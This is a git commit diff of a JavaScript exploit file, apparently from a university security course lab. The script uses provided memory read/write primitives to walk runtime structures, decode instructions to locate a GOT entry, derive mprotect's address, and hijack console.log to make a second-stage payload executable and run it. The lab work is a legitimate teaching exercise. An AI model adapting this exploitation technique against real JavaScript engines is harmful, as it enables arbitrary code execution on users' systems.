607267500cdfb39ae92a4530db558e769b9ce8db
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-12 21:57:04 -0500

    Update partc.js

--- proj5/partc.js
+++ proj5/partc.js
@@ -14,21 +14,17 @@ let second_stage =
  * NEED TO FIND WHERE MPROTECT IS
  */
 
-// mf = offset 0, 32 bits
 // ctx->rt->mf.js_malloc_usable_size
 let addressconsole = cs361s.addrof(console.log);
 let ctx = cs361s.readmem(addressconsole + 48);
 let rt = cs361s.readmem(ctx + 24);
 let jsMallocUsableSize = cs361s.readmem(rt + 24);
-
-// auipc offset (top 20 is immediate)
-let aupic_offset = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12;
-// ld offset (top 12 is immediate)
-let ld_offset = cs361s.readmem(jsMallocUsableSize + 4) >> 20;
-//get address of malloc usable size
-let mallocUsableSizeAddress = cs361s.readmem(jsMallocUsableSize + aupic_offset + ld_offset);
+let auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
+let payload = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
+//GOT = game of thrones :)
+let gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + payload);
 //get address of mprotect by decrementing malloc usable size address
-let addressmprotect = mallocUsableSizeAddress - 0x31B00; 
+let addressmprotect = gameofthrones - 0x31B00; 
 
 /* Populate with Second Stage Payload
  * Either mark the page that holds the second_stage string rwx or 
@@ -39,11 +35,9 @@ let addressmprotect = mallocUsableSizeAddress - 0x31B00;
  */
 let secondstageaddress = cs361s.addrof(second_stage);
 
-//let old_realm = cs361s.readmem(addressconsole + 48);
 cs361s.writemem(addressconsole + 48, secondstageaddress); // overwrite realm
 cs361s.writemem(addressconsole + 56, addressmprotect);
 console.log.apply(2.0237e-320, null); // rwx
 // Execute Payload
-//cs361s.writemem(addressconsole + 48, old_realm); // restore realm
-cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 HAHAHAHAHHAHAHA
+cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 
 console.log();
